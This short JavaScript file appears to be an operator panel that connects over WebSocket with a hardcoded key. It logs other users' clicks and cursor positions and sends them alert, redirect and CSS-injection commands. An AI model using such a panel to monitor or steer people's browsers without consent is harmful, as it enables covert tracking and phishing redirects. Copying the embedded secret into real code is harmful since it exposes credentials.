const WS_URL = 'wss://VOTRE_DOMAINE.com:8080?role=war&key=Ultr4S3cr3t2025!';
const socket = new WebSocket(WS_URL);
const log   = document.getElementById('log');

socket.onmessage = ({data})=>{
  const msg = JSON.parse(data);
  if(msg.type==='interaction'){
    const line = document.createElement('div');
    line.textContent = `${new Date(msg.ts).toLocaleTimeString()} | ${msg.event} ${msg.element} (${msg.x||''},${msg.y||''})`;
    log.appendChild(line);
    log.scrollTop = log.scrollHeight;
  }
};

document.querySelectorAll('button[data-cmd]').forEach(btn=>{
  btn.onclick = ()=>{
    const cmd = btn.dataset.cmd;
    let payload;
    if(cmd==='alert') payload = prompt('Message ?');
    else if(cmd==='redirect') payload = prompt('URL ?');
    else if(cmd==='css') payload = document.getElementById('cssInject').value;
    socket.send(JSON.stringify({type:'command',action:cmd,payload}));
  };
});
